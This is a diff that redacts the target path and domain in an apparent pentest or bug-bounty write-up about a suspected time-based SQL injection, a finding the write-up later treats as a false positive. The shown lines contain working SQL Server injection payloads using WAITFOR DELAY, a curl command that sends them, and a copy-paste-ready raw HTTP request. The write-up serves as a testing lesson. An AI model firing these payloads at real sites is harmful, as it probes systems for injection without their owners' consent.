@@ -14,7 +14,7 @@
 
 ## Methodology (what was tested)
 
-**Endpoint:** `GET /about-us/business-and-brands/?RID=320` — Microsoft SQL Server suspected.
+**Endpoint:** `GET [REDACTED-PATH]` — Microsoft SQL Server suspected.
 
 **Payloads tested (time-based):**
 ```
@@ -25,7 +25,7 @@ RID=320'; IF EXISTS(SELECT * FROM wp_users) WAITFOR DELAY '00:00:07'-- -
 
 **CURL harness (≤3 req/s, no RAHAD header during testing):**
 ```bash
-time curl -G "https://target/about-us/business-and-brands/" \
+time curl -G "https://target[REDACTED-PATH]" \
   --data-urlencode "RID=320'; WAITFOR DELAY '00:00:07'-- -" -s -o /dev/null
 ```
 
@@ -33,8 +33,8 @@ time curl -G "https://target/about-us/business-and-brands/" \
 
 **Raw HTTP provided to triage (copy-paste ready):**
 ```
-GET /about-us/business-and-brands/?RID=320%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A07%27--%20- HTTP/1.1
-Host: www.[REDACTED-DOMAIN]
+GET [REDACTED-PATH]%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A07%27--%20- HTTP/1.1
+Host: [REDACTED-DOMAIN]
 ```
 
 ## Why It Was False Positive (lesson)
